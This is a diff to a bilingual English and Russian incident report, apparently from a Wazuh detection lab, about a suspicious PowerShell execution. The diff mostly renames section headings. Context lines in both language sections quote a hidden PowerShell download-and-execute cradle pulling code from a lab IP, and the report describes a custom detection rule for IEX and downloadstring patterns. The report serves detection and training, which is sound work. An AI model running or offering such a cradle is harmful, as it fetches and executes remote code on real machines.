@@ -18,7 +18,7 @@ The endpoint (WIN10-PC) executed the following command (captured by Sysmon Event
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.103/'))"
 ```
 
-## 3. Analysis:
+## 3. Analysis
 
 *   **-nop (NoProfile) and -w hidden are common evasion techniques used by attackers to hide the execution window.**
 *   **IEX (Invoke-Expression) combined with downloadstring indicates an attempt to download and execute code directly in memory (fileless malware technique).**
@@ -59,27 +59,27 @@ MITTRE:
 ### Русский
 # Отчёт об инциденте: Подозрительное выполнение PowerShell (T1059.001)
 
-## 1. Сведения об алерте
+## 1. Детали алерта
 *   **ID правила:** 92027 (базовое) / 100200 (пользовательское)
 *   **Уровень критичности:** Level 4 (базовый) -> Level 12 (пользовательский после настройки)
 *   **Описание:** Процесс PowerShell породил экземпляр PowerShell / Подозрительное выполнение PowerShell DownloadString
 *   **MITRE ATT&CK:** T1059.001 (PowerShell), T1105 (Ingress Tool Transfer)
 *   **Агент:** WIN10-PC (192.168.56.110)
 
-## 2. Обнаружение и анализ
+## 2. Обзор инцидента
 Конечная точка (WIN10-PC) выполнила следующую команду (зафиксировано Sysmon Event ID 1):
 ```powershell
 powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.103/'))"
 ```
 
-## 3. Анализ:
+## 3. Расследование и анализ
 
 *   **-nop (NoProfile) и -w hidden — распространённые техники обхода защиты, используемые злоумышленниками для скрытия окна выполнения.**
 *   **IEX (Invoke-Expression) в сочетании с downloadstring указывает на попытку загрузить и выполнить код непосредственно в памяти (техника бесфайлового вредоносного ПО).**
 *   **IP-адрес назначения (192.168.56.103) — это локальный SIEM-сервер, приведённый в качестве примера.**
 *   **Вердикт: True Positive. Активность явно указывает на вредоносный умысел (сигналы C2 / выполнение полезной нагрузки).**
 
-## 4. Устранение последствий
+## 4. Устранение
 Изначально Wazuh сработал по правилу 92027 (Level 4), которое обнаруживало только поведение «PowerShell внутри PowerShell», но не помечало вредоносные аргументы.
 Для улучшения возможностей обнаружения было создано пользовательское правило в `/var/ossec/etc/rules/local_rules.xml`, чтобы явно искать шаблоны IEX и downloadstring, повысив критичность до Level 12.
 
